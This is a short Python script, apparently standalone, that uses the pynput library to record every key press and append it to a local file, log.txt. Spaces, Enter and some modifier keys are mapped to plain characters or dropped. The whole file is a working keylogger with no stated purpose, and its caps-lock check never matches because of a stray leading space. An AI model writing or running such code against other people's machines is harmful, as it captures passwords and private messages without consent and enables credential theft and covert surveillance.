from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.shift":
        letter = ""
    if letter == " Key.caps_lock":
        letter = ""

    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
